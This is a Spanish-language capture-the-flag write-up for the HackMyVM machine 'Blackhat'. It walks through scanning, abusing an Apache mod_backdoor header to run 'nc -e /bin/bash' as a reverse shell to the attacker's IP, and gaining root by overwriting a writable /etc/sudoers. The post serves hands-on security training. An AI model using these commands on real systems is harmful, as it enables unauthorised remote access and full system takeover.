---
layout: post
title: Blackhat - Hackmyvm
tags: [ctf, hackmyvm]
---

**Autor**: Cromiphi \\
**Dificultad**: Fácil

![img](/imgs/write-ups/hackmyvm/blackhat/blackhat_1.png#center)

## Reconocimiento

Lo primero es conocer la IP de la máquina víctima. La puedo encontrar con el siguiente comando:

```
$ sudo arp-scan -l | grep -i pc
```

Y en mi caso la direccion es "192.168.1.79"

Tras esto, realizo un escaneo rápido con nmap para ver que tiene el puerto 80 abierto.

```
$ sudo nmap 192.168.1.79  
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-06 16:18 EST
Nmap scan report for 192.168.1.79
Host is up (0.00022s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:F3:BA:56 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
```

Con "gobuster" encuentro el archivo "phpinfo.php".

El servidor está usando el módulo "mod_backdoor". Si lo buscamos en google encontraremos un script en python echo por [WangYihang](https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor/blob/master/exploit.py) que nos permite ejecutar comandos en el servidor.

![img](/imgs/write-ups/hackmyvm/blackhat/blackhat_2.png#center)

## Explotación

Obtengo una shell inversa con

```
$ curl -H "Backdoor: nc -e /bin/bash 192.168.1.168 1234" http://192.168.1.79
```

## Escalado de privilegios

Tras una pequeña enumeración veo que existe el usuario "darkdante" y casualmente no tiene contraseña, por lo que simplemente ejecutando

```
www-data@blackhat:/$ su darkdante
darkdante@blackhat:/$ :)
```

Obtengo sesión con dicho usuario.

Continuando con la enumeración para llegar a root encuentro que puedo modificar el archivo "/etc/sudoers":

```
darkdante@blackhat:/$ getfacl /etc/sudoers
getfacl /etc/sudoers
getfacl: Removing leading '/' from absolute path names
# file: etc/sudoers
# owner: root
# group: root
user::r--
user:darkdante:rw-
group::r--
mask::rw-
other::---
```

Por lo que obtener privilegios de root es trivial.

```
darkdante@blackhat:/$ echo "darkdante ALL=(ALL:ALL) ALL" > /etc/sudoers
darkdante@blackhat:/$ sudo su
root@blackhat:/#
```

Muchas gracias a **Cromiphi** por esta máquina.
